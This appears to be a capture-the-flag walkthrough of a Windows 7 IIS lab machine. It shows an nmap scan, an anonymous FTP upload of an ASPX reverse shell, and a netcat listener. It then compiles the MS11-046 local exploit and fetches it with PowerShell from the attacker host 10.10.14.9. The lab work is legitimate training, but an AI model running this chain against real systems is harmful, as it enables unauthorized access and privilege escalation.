@@ -1,0 +1,100 @@
+I start off with an nmap scan
+└─# nmap -sC -sV -A 10.10.10.5
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     Microsoft ftpd
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| 03-18-17  02:06AM       <DIR>          aspnet_client
+| 05-05-21  01:41PM                    0 hola.txt
+| 03-17-17  05:37PM                  689 iisstart.htm
+| 05-05-21  02:16PM                 2881 pepito.aspx
+| 05-05-21  01:54PM                38256 reverse.asp
+| 05-05-21  02:09PM                 2874 reverse.aspx
+| 05-05-21  02:25PM                 2904 rs.aspx
+|_03-17-17  05:37PM               184946 welcome.png
+| ftp-syst: 
+|_  SYST: Windows_NT
+80/tcp open  http    Microsoft IIS httpd 7.5
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/7.5
+|_http-title: IIS
+The ftp anonymous port is what i go for next. With an aspx shell hosted on https://github.com/borjmz/aspx-reverse-shell/blob/master/shell.aspx
+└─# ftp 10.10.10.5
+Connected to 10.10.10.5.
+220 Microsoft FTP Service
+Name (10.10.10.5:joe): anonymous
+331 Anonymous access allowed, send identity (e-mail name) as password.
+Password:
+230 User logged in.
+Remote system type is Windows_NT.
+ftp> put shell.aspx
+local: shell.aspx remote: shell.aspx
+200 PORT command successful.
+125 Data connection already open; Transfer starting.
+226 Transfer complete.
+16392 bytes sent in 0.00 secs (27.1400 MB/s)
+ftp> ls
+200 PORT command successful.
+150 Opening ASCII mode data connection.
+03-18-17  02:06AM       <DIR>          aspnet_client
+05-06-21  04:28AM                16392 shell.aspx
+
+And setup a netcat listener : nc -lvnp 1234
+c:\windows\system32\inetsrv>whoami
+whoami
+iis apppool\web
+System info followed by Google search of OS Version: 6.1.7600 N/A Build 7600 with no hotfixes applied.
+c:\Users>systeminfo
+systeminfo
+
+Host Name:                 DEVEL
+OS Name:                   Microsoft Windows 7 Enterprise 
+OS Version:                6.1.7600 N/A Build 7600
+OS Manufacturer:           Microsoft Corporation
+OS Configuration:          Standalone Workstation
+OS Build Type:             Multiprocessor Free
+Registered Owner:          babis
+Registered Organization:   
+Product ID:                55041-051-0948536-86302
+Original Install Date:     17/3/2017, 4:17:31 ��
+System Boot Time:          5/5/2021, 1:14:08 ��
+System Manufacturer:       VMware, Inc.
+System Model:              VMware Virtual Platform
+System Type:               X86-based PC
+Processor(s):              1 Processor(s) Installed.
+                           [01]: x64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
+BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
+Windows Directory:         C:\Windows
+System Directory:          C:\Windows\system32
+Boot Device:               \Device\HarddiskVolume1
+System Locale:             el;Greek
+Input Locale:              en-us;English (United States)
+Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
+Total Physical Memory:     3.071 MB
+Available Physical Memory: 2.473 MB
+Virtual Memory: Max Size:  6.141 MB
+Virtual Memory: Available: 5.549 MB
+Virtual Memory: In Use:    592 MB
+Page File Location(s):     C:\pagefile.sys
+Domain:                    HTB
+Logon Server:              N/A
+Hotfix(s):                 N/A
+Network Card(s):           1 NIC(s) Installed.
+                           [01]: vmxnet3 Ethernet Adapter
+                                 Connection Name: Local Area Connection 3
+                                 DHCP Enabled:    No
+                                 IP address(es)
+                                 [01]: 10.10.10.5
+                                 [02]: fe80::58c0:f1cf:abc6:bb9e
+                                 [03]: dead:beef::c4ea:157a:1dd6:7578
+                                 [04]: dead:beef::58c0:f1cf:abc6:bb9e
+The exploit at https://www.exploit-db.com/raw/40564 stood out.
+└─# i686-w64-mingw32-gcc MS11-046.c -o MS11-046.exe -lws2_32
+powershell -c "(New-Object System.Net.WebCient).DownloadFile('http://10.10.14.9/MS11-046.exe', 'MS11-046.exe')"
+This is not working, I just need to start the ftp again and upload the exe.
+Usually running the exploit would lead to an escalation to admin user
+c:\inetpub\wwwroot>MS11-046.exe
+MS11-046.exe
+This program cannot be run in DOS mode.
+========================================
+Am now going to try this with metasploit just to be sure everything here works fine.
